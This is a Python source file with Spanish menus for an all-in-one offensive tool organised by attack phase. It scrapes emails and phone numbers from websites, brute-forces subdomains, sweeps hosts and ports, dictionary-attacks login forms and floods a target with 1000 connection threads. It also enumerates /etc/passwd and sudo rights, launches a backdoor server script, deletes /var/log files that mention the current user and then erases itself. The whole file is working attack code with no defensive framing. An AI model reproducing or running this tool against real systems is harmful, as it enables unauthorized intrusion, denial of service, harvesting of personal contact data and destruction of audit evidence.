#!/usr/bin/python3

import socket
import subprocess
import urllib.request
import re, sys, subprocess,os
import platform
import requests
import threading, subprocess
import time
from socket import *
from datetime import datetime
from getpass import getuser
from bs4 import BeautifulSoup


def mostrar_menu(nombre, opciones):  
    print(f'# {nombre}. Seleccione una opción:')
    for clave in sorted(opciones):
        print(f' {clave}) {opciones[clave][0]}')


def leer_opcion(opciones):
    while (a := input('Opción: ')) not in opciones:
        print('Opción incorrecta, vuelva a intentarlo.')
    return a


def ejecutar_opcion(opcion, opciones):
    opciones[opcion][1]()


def generar_menu(nombre, opciones, opcion_salida): 
    opcion = None
    while opcion != opcion_salida:
        mostrar_menu(nombre, opciones)
        opcion = leer_opcion(opciones)
        ejecutar_opcion(opcion, opciones)
        print()


def menu_principal():
    opciones = {
        '1': ('Fase de Reconocimiento', Reconocimiento),
        '2': ('Fase de Escaneo', Escaneo), 
        '3': ('Fase de Obtener acceso', ObtenerAcceso),
        '4': ('Fase de Mantener acceso', MantenerAcceso),
        '5': ('Fase de Limpiar huellas', LimpiarHuellas),
        '0': ('Salir', salir)
    }

    generar_menu('Menú principal', opciones, '0')  # indicamos el nombre del menú


# A partir de aquí creamos las funciones que ejecutan las acciones de los menús
def Reconocimiento():
    print('Has elegido la fase de Reconocimiento\n')

    opciones = {
        'a': ('Busqueda de Subdominios', busquedaSubdominios),
        'b': ('Busqueda de Correos', busquedaCorreos),
        'c': ('Busqueda de Telefónos', busquedaTelefonos),
        'd': ('Volver al menú principal', salir)
    }

    generar_menu('Submenú de la fase de Reconocimiento', opciones, 'd')  # indicamos el nombre del submenú

def Escaneo():
    print('Has elegido la fase de Escaneo\n')

    opciones = {
        'a': ('Descubrir sistema operativo', descubrirSO),
        'b': ('Descubrir hosts de una red', descubrirHosts),
        'c': ('Descubrir puertos de un host', escaneoPuertos),
        'd': ('Volver al menú principal', salir)
    }

    generar_menu('Submenú de la fase de Escaneo', opciones, 'd')  # indicamos el nombre del submenú


def ObtenerAcceso():
    print('Has elegido la fase de Obtener Acceso\n')

    opciones = {
        'a': ('Atacar por fuerza bruta una página de login', accesoLogin),
        'b': ('Denegación de servicio', dos),
        'c': ('Volver al menú principal', salir)
    }

    generar_menu('Submenú de la fase Obtener Acceso', opciones, 'c')  # indicamos el nombre del submenú


def MantenerAcceso():
    print('Has elegido la fase de Mantener Acceso\n')

    opciones = {
        'a': ('Búsqueda de informacion de la maquina', busquedaInformacion),
        'b': ('Iniciar puerta trasera', puertaTrasera),
        'c': ('Volver al menú principal', salir)
    }

    generar_menu('Submenú de la fase Mantener Acceso', opciones, 'c')  # indicamos el nombre del submenú

def LimpiarHuellas():
    print('Has elegido la fase de Limpiar Huellas\n')

    opciones = {
        'a': ('Borrado de logs', borradoLog),
        'b': ('Borrar herramienta', borrarHerramienta),
        'c': ('Volver al menú principal', salir)
    }

    generar_menu('Submenú de la fase Limpiar Huellas', opciones, 'c')  # indicamos el nombre del submenú

def busquedaSubdominios():
    print('\nBusqueda de Subdominios\n')
    dominio = input("Introduzca el dominio: ")
    print("\n")
    listasubdominios = open("subdominios.txt",'r')
    subdominios = listasubdominios.readlines()
    for subdominio in subdominios:
        try:
            subdominioprueba=subdominio.strip() + "." + dominio.strip()
            socket.gethostbyname(subdominioprueba)
            print("Subdominio encontrado: " + subdominioprueba)
        except: pass


def busquedaCorreos():
    print('\nBusqueda de correos\n')
    imageExt = (".jpeg", ".jpg", ".exif", ".tif", ".tiff", ".gif", ".bmp", ".png", ".ppm",
			".pgm", ".pbm", ".pnm", ".webp", ".hdr", ".heif", ".bat", ".bpg", ".cgm", ".svg")

    url = input ("Introduce el dominio donde quieres buscar: ")

    urlseparada=url.split('.')

    if(len(urlseparada)==2):
        url="https://www."+url

    if(len(urlseparada)==3):
        if(urlseparada[0]=="www"):
            url="https://"+url

    listaEmails = []
    listaUrl = []
    lista = []

    datos = urllib.request.urlopen(url).read().decode()

    emails = re.findall(r'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,3}', datos)


    for email in emails:
        if email not in listaEmails and not email.endswith(imageExt):
            listaEmails.append(email)
            lista.append([email,url])

    soup = BeautifulSoup(datos, "lxml")
    enlaces = soup.find_all('a')

    for enlace in enlaces:
        link = enlace.get('href', None)
        if(link is not None and link[0:4] == 'http' and link not in listaUrl):
            try:
                datos = urllib.request.urlopen(link).read().decode()
            except: pass

        elif(link is not None and link[0] == '/'):
            try:
                datos = urllib.request.urlopen(url+link).read().decode()
            except: pass

        emails = re.findall(r'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}', datos)
        listaUrl.append(link)

        for email in emails:
            if email not in listaEmails and not email.endswith(imageExt):
                listaEmails.append(email)
                lista.append([email,link])
            
        

    print("Correos encontrados:\n")
    for valores in lista:
        print(valores[0] + " en " + valores[1])

def busquedaTelefonos():
    print('\nBusqueda de Telefonos\n')
    url = input ("Introduce el dominio donde quieres buscar: ")

    urlseparada=url.split('.')

    if(len(urlseparada)==2):
        url="https://www."+url

    if(len(urlseparada)==3):
        if(urlseparada[0]=="www"):
            url="https://"+url

    listaTelefonos = []
    listaUrl = []
    lista = []

    datos = urllib.request.urlopen(url).read().decode()

    telefonos = re.findall(r'[\+34]*?[ -]?[6-9]{1}[0-9]{2}[ -]?[0-9]{2,3}[ -]?[0-9]{2,3}[ -]?[0-9]{0,3}', datos)


    for telefono in telefonos:
        if comprobarTelefono(telefono):
            if telefono not in listaTelefonos:
                listaTelefonos.append(telefono)
                lista.append([telefono,url])

    soup = BeautifulSoup(datos, "lxml")
    enlaces = soup.find_all('a')

    for enlace in enlaces:
        link = enlace.get('href', None)
        if(link is not None and link[0:4] == 'http' and link not in listaUrl):
            try:
                datos = urllib.request.urlopen(link).read().decode()
            except: pass

        elif(link is not None and link[0] == '/'):
            try:
                datos = urllib.request.urlopen(url+link).read().decode()
            except: pass

        telefonos = re.findall(r'[\+34]*?[ -]?[6-9]{1}[0-9]{2}[ -]?[0-9]{2,3}[ -]?[0-9]{2,3}[ -]?[0-9]{0,3}', datos)
        listaUrl.append(link)

        for telefono in telefonos:
            if comprobarTelefono(telefono):
                if telefono not in listaTelefonos:
                    listaTelefonos.append(telefono)
                    lista.append([telefono,link])
            
        

    print("Posibles Telefonos encontrados:\n")
    for valores in lista:
        print(valores[0] + " en " + valores[1])

def comprobarTelefono(telefono):

    countnum=0
    countguion=0
    countespacio=0
    countpunto=0
    counttotal=0

    if telefono.find("+")!=-1:
        
        for i in range(0,len(telefono)):
            if(telefono[i].isnumeric()):
                countnum+=1
            if(telefono[i]=="-"):
                countguion+=1
            if(telefono[i]=="."):
                countpunto+=1
            if(telefono[i]==" "):
                countespacio+=1
            counttotal+=1
            
            
        if(countnum==11 and counttotal==11):
            return True
        elif(countnum==11 and (countguion==2 or countguion==3)):
            return True
        elif(countnum==11 and (countpunto==2 or countpunto==3)):
            return True
        elif(countnum==11 and (countespacio==2 or countespacio==3)):
            return True
    else:
        for i in range(0,len(telefono)):
            if(telefono[i].isnumeric()):
                countnum+=1
            if(telefono[i]=="-"):
                countguion+=1
            if(telefono[i]=="."):
                countpunto+=1
            if(telefono[i]==" "):
                countespacio+=1
            counttotal+=1
            
        if(countnum==9 and counttotal==9):
            return True
        elif(countnum==9 and (countguion==2 or countguion==3)):
            return True
        elif(countnum==9 and (countpunto==2 or countpunto==3)):
            return True
        elif(countnum==9 and (countespacio==2 or countespacio==3)):
            return True
    return False    

def descubrirSO():
    print('\nDescrubir sistema operativo del host\n')
    ip = input("Introduzca la dirección IP: ")
    print("\n")

    proc = subprocess.Popen(["/usr/bin/ping -c 1 %s" % ip, ""], stdout=subprocess.PIPE, shell=True)
    (out,err) = proc.communicate()

    out = out.split()

    out = out[12].decode('utf-8')

    ttl_value = re.findall(r"\d{1,3}", out)[0]

    ttl = int(ttl_value)

    if ttl >= 0 and ttl <= 64:
        os="Linux"
    elif ttl >= 65 and ttl <= 128:
        os="Windows"
    else:
        os="Not Found"

    print("OS: " + os + ". Dirección IP: " + ip + "\n")

def descubrirHosts():
    NHILOS = 4

    print('\nDescrubir host de una red\n')
    ip = input("Introduzca la dirección IP: ")

    ip = re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.", ip)[0]
    primero = int(input("Ingrese el número desde donde empiece el escaneo: "))
    ultimo = int(input("Ingresa el número donde termine el escaneo: "))
    while(primero<1 or primero >256 or ultimo<1 or ultimo >256):
        print("Solo se puede escribir valores entre 1 y 256")
        primero = int(input("Ingrese el número desde donde empiece el escaneo: "))
        ultimo = int(input("Ingresa el número donde termine el escaneo: "))
    


    if (platform.system()=="Windows"):
        ping = "ping -n 1"
    else :
        ping = "ping -c 1"
        

    class Hilo (threading.Thread):
        def __init__(self,inicio,fin):
            threading.Thread.__init__(self)
            self.inicio = inicio
            self.fin = fin
            
        def run(self):
            for num in range(self.inicio,self.fin):
                direccion = ip+str(num)
                out = os.popen(ping+" "+direccion)
                for line in out.readlines():
                    if ("1 received" in line.lower()):
                        print("Dirección IP: " + direccion +  ": ACTIVA")
                        break



    tiempoInicio = datetime.now()
    print("[*] El escaneo se va a realizar desde la dirección ",ip+str(primero),"hasta ",ip+str(ultimo))
    numeroIPs = ultimo-primero
    numeroHilos = int((numeroIPs/NHILOS))
    hilos = []

    try:
        for i in range(numeroHilos):
            finAux = primero+NHILOS
            if(finAux > ultimo):
                finAux = ultimo
            hilo = Hilo(primero, finAux)
            hilo.start()
            hilos.append(hilo)
            primero = finAux
    except Exception as e:
        print("[!] Error creando los hilos:",e)
        sys.exit(2)


    for hilo in hilos:
        hilo.join()

    tiempoFinal = datetime.now()
    tiempo = tiempoFinal - tiempoInicio
    print("[*] El escaneo ha durado %s"%tiempo)

def escaneoPuertos():
    NHILOS = 4

    print('\nDescrubir puertos de un hosts\n')
    ip = input("Introduzca la dirección IP: ")

    print("Rango de puertos [1-65535]")
    primero = int(input("Ingrese el puerto desde donde empiece el escaneo: "))
    ultimo = int(input("Ingresa el número donde termine el escaneo: "))

    while(primero<1 or primero >65535 or ultimo<1 or ultimo >65535):
        print("Solo se puede escribir valores entre 1 y 65535")
        primero = int(input("Ingrese el puerto desde donde empiece el escaneo: "))
        ultimo = int(input("Ingresa el número donde termine el escaneo: "))

    class Hilo (threading.Thread):
        def __init__(self,inicio,fin):
            threading.Thread.__init__(self)
            self.inicio = inicio
            self.fin = fin
            
        def run(self):
            for puerto in range(self.inicio,self.fin):
                sock = socket(AF_INET, SOCK_STREAM)
                sock.settimeout(10)
                abierto = sock.connect_ex((ip, puerto))
                if abierto == 0:
                    print ("Puerto Abierto:", puerto)
                sock.close()


    tiempoInicio = datetime.now()
    print("[*] El escaneo se va a realizar desde el puerto ",str(primero),"hasta ",str(ultimo)," de la dirección ", ip)
    numeroPuertos = ultimo-primero
    numeroHilos = int((numeroPuertos/NHILOS))
    hilos = []

    try:
        for i in range(numeroHilos):
            finAux = primero+NHILOS
            if(finAux > ultimo):
                finAux = ultimo
            hilo = Hilo(primero, finAux)
            hilo.start()
            hilos.append(hilo)
            primero = finAux
    except Exception as e:
        print("[!] Error creando los hilos:",e)
        sys.exit(2)


    for hilo in hilos:
        hilo.join()

    tiempoFinal = datetime.now()
    tiempo = tiempoFinal - tiempoInicio
    print("[*] El escaneo ha durado %s"%tiempo)

def accesoLogin():
    print('\nIntento de acceso login mediante fuerza bruta\n')
    url = input ("Introduce el dominio del login: ")
    print("\n")

    urlseparada=url.split('.')

    if(len(urlseparada)==2):
        url="https://www."+url

    if(len(urlseparada)==3):
        if(urlseparada[0]=="www"):
            url="https://"+url

    datos = urllib.request.urlopen(url).read().decode()

    #Buscamos el formulario
    inicio=datos.index("<form")
    final=datos.index("</form>")+7

    datos=datos[inicio:final]

    metodo=re.findall(r'method=\"post\"',datos)
    if(len(metodo)==1):
        print("El envio del formulario es mediante post")
        metodo="post"
    else:
        metodo=re.findall(r'"method=\"get\"',datos)
        if(len(metodo)==1):
            print("El envio del formulario es mediante get")
            metodo="get"
        
    variables=re.findall(r'<input.*>',datos)
    nombrevariables=[]
    valores=[]
    for variable in variables:
        nombre=re.findall(r'name=\"\w*\"',variable)
        final=len(str(nombre))
        nombre=str(nombre)
        nombre=nombre[8:final-3]
        nombrevariables.append(nombre)
        valor=re.findall('value=\"\w*\"',variable)
        final=len(str(valor))
        valor=str(valor)
        valor=valor[9:final-3]
        valores.append(valor)



    print("Las variables son: ",nombrevariables)
    numusuario=input("Escriba la posición de la variable de usuario(Siendo la primera posición 0): ")
    numpassword=input("Escriba la posición de la variable de la contraseña: ")
    cadenaerror=input("Escriba la cadena de fracaso, cuando hace login erroneo: ")

    usuarios=[]
    with open('users.txt', 'r') as filehandle:
        for line in filehandle:
            # remove linebreak which is the last character of the string
            currentPlace = line[:-1]
            # add item to the list
            usuarios.append(currentPlace)

    passwords=[]
    with open('passwords.txt', 'r') as filehandle:
        for line in filehandle:
            # remove linebreak which is the last character of the string
            currentPlace = line[:-1]
            # add item to the list
            passwords.append(currentPlace)

    encontrado=0
    if(metodo=="get"):
        countVariable=0
        cadenaVariables=""
        for variable in nombrevariables:
            if(countVariable!=int(numusuario) and countVariable!=int(numpassword) and countVariable!=len(nombrevariables)-1):
                cadenaVariables=cadenaVariables+"&"+variable+"="+valores[countVariable]
            countVariable+=1


        for usuario in usuarios:
            for password in passwords:
                cadena="?"+nombrevariables[int(numusuario)]+"="+usuario+"&"+nombrevariables[int(numpassword)]+"="+password+cadenaVariables+"&"+nombrevariables[-1]+"="+valores[-1]
                envio=url+cadena
                response = requests.get(envio)
                if(response.text.find(cadenaerror)==-1):
                    encontrado=1
                    print("Usuario y contraseña encontrados: Usuario: ", usuario, " Contraseña: ", password)
        
    

    elif(metodo=="post"):
        diccionario={}
        countVariable=0
        for variable in nombrevariables:
            if(countVariable!=int(numusuario) and countVariable!=int(numpassword) and countVariable!=len(nombrevariables)-1):
                diccionario[variable]=valores[countVariable]
            countVariable+=1
        
    
        for usuario in usuarios:
            for password in passwords:
                diccionario[nombrevariables[int(numusuario)]]=usuario
                diccionario[nombrevariables[int(numpassword)]]=password
                diccionario[nombrevariables[-1]]=valores[-1]

                response = requests.post(url, data = diccionario)

                if(response.text.find(cadenaerror)==-1):
                    encontrado=1
                    print("Usuario y contraseña encontrados: Usuario: ", usuario, " Contraseña: ", password)


    if(encontrado==0):
        print("Usuario y contraseña no encontrado")

def dos():
    print('\Denegación de Servicios\n')
 
    ip = input ("Introduce la ip que se desea atacar: ")
    port = input ("Introduce el puerto ")
            
    def run(stop): 
        while True: 
            try:
                s = socket(AF_INET, SOCK_STREAM)
                s.connect((ip, int(port)))
                s.sendto(('GET /' + ip + ' HTTP/1.1\r\n').encode('ascii'), (ip, int(port)))
            except: pass
            if stop(): 
                break
    hilos = []

    stop_threads = False
    print("Lanzando ataque a la dirección ", ip, " puerto ", port)
    for i in range(1000):
        hilo = threading.Thread(target = run, args =(lambda : stop_threads, )) 
        hilos.append(hilo)
        hilo.start() 
        

    letra=input("Pulsar enter para parar el ataque")
    stop_threads = True

    print("Parando ataque...")
    for hilo in hilos:
        hilo.join()
    print("Ataque finalizado!")   

def busquedaInformacion():
    usuario=subprocess.getoutput(['whoami'])
    print("Usuario de la shell actual: ", usuario, "\n")

    id=subprocess.getoutput(['id'])
    print("Nivel de permisos: ", id, "\n")

    host=subprocess.getoutput(['hostname'])
    print("Nombre de la máquina: ", host, "\n")

    info=subprocess.getoutput(['uname -a'])
    print("Información del kernel: ", info, "\n")

    so=subprocess.getoutput(['uname -r'])
    busqueda="searchsploit "+so
    vuln=subprocess.getoutput([busqueda])
    print("Vulnerabilidades encontradas según versión del kernel: \n")
    print(vuln)
    print("\n")

    usuarios=subprocess.getoutput(['cat /etc/passwd'])
    usuarios=usuarios.split("\n")
    listausuarios=[]
    for usuario in usuarios:
        usuario=usuario.split(":")
        listausuarios.append(usuario[0])
    print("Lista de usuarios del sistema: ", listausuarios, "\n")

    permisos=subprocess.getoutput(['sudo -l'])
    print("Permisos de sudo del actual usuario: ", permisos, "\n")     

def puertaTrasera():
    print("Iniciando puerta trasera\n")
    
    subprocess.Popen(['python3', 'server.py','<', '/dev/null', '>', '/tmp/mylogfile', '2>&1', '&'])
    time.sleep(1)

def borradoLog():
    dir = "/var/log/"
    lista_ficheros = os.listdir(dir)
    usuario=getuser()
    print("Buscando información sobre ",usuario)
    for fichero in lista_ficheros:
        if(os.path.isfile(os.path.join(dir, fichero))):
            try:
                if(open(dir+fichero, 'r').read().find(usuario)!=-1):
                    print("Se debe eliminar el fichero: "+dir+fichero)
                    os.remove(dir+fichero)
                    printf("Fichero "+dir+fichero, " eliminado")
                else:
                    print("No hay información relevante en este fichero "+dir+fichero)        
                    
            except FileNotFoundError:
                print("No se encuentra ese fichero" + dir + fichero)
            except PermissionError:
                print("No tengo permiso leer o borrar ese fichero " + dir + fichero)
            except UnicodeDecodeError:
                print("Fichero codificado "+ dir + fichero)
        else:
            try:
                dirinterno=dir+fichero+"/"
                print("Leyendo en el directorio: ", dirinterno)
                lista_ficheros = os.listdir(dirinterno)
                for fichero in lista_ficheros:
                    if(os.path.isfile(os.path.join(dirinterno, fichero))):
                        if(open(dirinterno+fichero, 'r').read().find(usuario)!=-1):
                            print("Se debe eliminar el fichero: ", fichero)
                            os.remove(dirinterno+fichero)
                            printf("Fichero ", fichero, " eliminado")
                        else:
                            print("No hay información relevante en este fichero "+dirinterno+fichero)        
            except FileNotFoundError:
                print("No se encuentra ese fichero"+ dir + fichero)
            except PermissionError:
                print("No tengo permiso leer o borrar ese fichero "+ dirinterno + fichero)
            except UnicodeDecodeError:
                print("Fichero codificado "+ dirinterno + fichero) 

def borrarHerramienta():
    dir = os.getcwd()+"/"
    lista_ficheros = os.listdir(dir)
    for fichero in lista_ficheros:
        print("Eliminado el fichero ", fichero)
        os.remove(dir + fichero)

    os.rmdir(dir)
    print("Eliminado la carpeta ", dir)
    print(sys.exit())

def salir():
    print('Saliendo')


if __name__ == '__main__':
    menu_principal() # iniciamos el programa mostrando el menú principal
